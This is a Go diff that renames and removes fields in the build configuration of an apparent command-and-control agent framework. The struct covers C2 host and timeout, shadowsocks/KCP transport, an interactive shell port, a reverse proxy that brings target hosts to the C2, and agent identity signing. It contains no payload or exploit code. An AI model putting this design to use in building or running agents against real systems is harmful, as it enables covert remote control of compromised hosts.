@@ -15,9 +15,9 @@ func ReadJSONConfig(jsonData []byte, config_to_write *Config) (err error) {
 		return fmt.Errorf("failed to parse JSON config: %v", err)
 	}
 	calculateReverseProxyPort := func() string {
-		p, err := strconv.Atoi(config_to_write.Emp3r0rProxyServerPort)
+		p, err := strconv.Atoi(config_to_write.AgentSocksServerPort)
 		if err != nil {
-			log.Printf("WTF? Emp3r0rProxyPort %s: %v. Invalid JSON config, perhaps start over with a new config file?", config_to_write.Emp3r0rProxyServerPort, err)
+			log.Printf("WTF? Emp3r0rProxyPort %s: %v. Invalid JSON config, perhaps start over with a new config file?", config_to_write.AgentSocksServerPort, err)
 			return "22222"
 		}
 
@@ -38,8 +38,8 @@ func ReadJSONConfig(jsonData []byte, config_to_write *Config) (err error) {
 // Config build.json config file
 type Config struct {
 	CCPort                    string `json:"cc_port"`                      // CC service port, TLS enabled
-	Emp3r0rProxyServerPort    string `json:"emp3r0r_proxy_port"`           // Socks5 proxy server port
-	AutoProxyTimeout          int    `json:"autoproxy_timeout"`            // timeout (in seconds) for agent side Socks5 server
+	AgentSocksServerPort      string `json:"agent_socks_server_port"`      // agent side socks5 proxy server port
+	AgentSocksTimeout         int    `json:"agent_socks_timeout"`          // timeout (in seconds) for agent side Socks5 server, 0 to disable
 	StagerHTTPListenerPort    string `json:"http_listner_port"`            // For stager HTTP server
 	Password                  string `json:"password"`                     // password of shadowsocks, socks5 and SSH server
 	ShadowsocksLocalSocksPort string `json:"shadowsocks_local_socks_port"` // socks5 port of shadowsocks
@@ -48,19 +48,18 @@ type Config struct {
 	KCPClientPort             string `json:"kcp_client_port"`              // client port of kcp
 	UseShadowsocks            bool   `json:"use_shadowsocks"`              // enable shadowsocks proxy server for C2 transport
 	UseKCP                    bool   `json:"use_kcp"`                      // enable KCP for Shadowsocks C2 transport
-	DisableNCSI               bool   `json:"disable_ncsi"`                 // disable NCSI connectivity checking, useful when C2 is reachable but NCSI is not
+	EnableNCSI                bool   `json:"enable_ncsi"`                  // NCSI connectivity checking, disable when C2 is reachable but NCSI is not
 	SSHHostKey                []byte `json:"ssh_host_key"`                 // SSH host (private) key (PEM string), used by remote forwarding server
 	ReverseProxyPort          string `json:"reverse_proxy_port"`           // Used to bring target host to C2, see Bring2CC
 	SSHDShellPort             string `json:"sshd_shell_port"`              // interactive shell
-	BroadcastPort             string `json:"broadcast_port"`               // UDP port used for broadcasting msg
+	BroadcastPort             string `json:"broadcast_port"`               // UDP port used for broadcasting msg, used by auto proxy chain
 	BroadcastIntervalMin      int    `json:"broadcast_interval_min"`       // seconds, set max to 0 to disable
 	BroadcastIntervalMax      int    `json:"broadcast_interval_max"`       // seconds, set max to 0 to disable
 	CCHost                    string `json:"cc_host"`                      // Address of C2 server
 	PIDFile                   string `json:"pid_file"`                     // PID of agent process
-	CCIndicator               string `json:"cc_indicator"`                 // URL of CC indicator
+	CCIndicatorURL            string `json:"cc_indicator_url"`             // URL of CC indicator
 	IndicatorWaitMin          int    `json:"indicator_wait_min"`           // seconds
 	IndicatorWaitMax          int    `json:"indicator_wait_max"`           // seconds, set max to 0 to disable
-	CCIndicatorText           string `json:"indicator_text"`               // what to send in response when indicator URL is requested
 	CAPEM                     string `json:"ca"`                           // CA cert from server side
 	CAFingerprint             string `json:"ca_fingerprint"`               // CA cert fingerprint
 	C2TransportProxy          string `json:"c2transport_proxy"`            // proxy for C2 transport
@@ -72,7 +71,7 @@ type Config struct {
 	AgentUUID                 string `json:"agent_uuid"`                   // UUID of agent, used to verify agent
 	AgentUUIDSig              string `json:"agent_uuid_sig"`               // UUID of agent signed by CA
 	AgentTag                  string `json:"agent_tag"`                    // generated from UUID, will be used to identidy agents
-	Timeout                   int    `json:"timeout"`                      // wait until this amount of milliseconds to re-connect to C2
+	CCTimeout                 int    `json:"c2_timeout"`                   // wait until this amount of milliseconds to re-connect to C2
 }
 
 // This will be patched by the builder
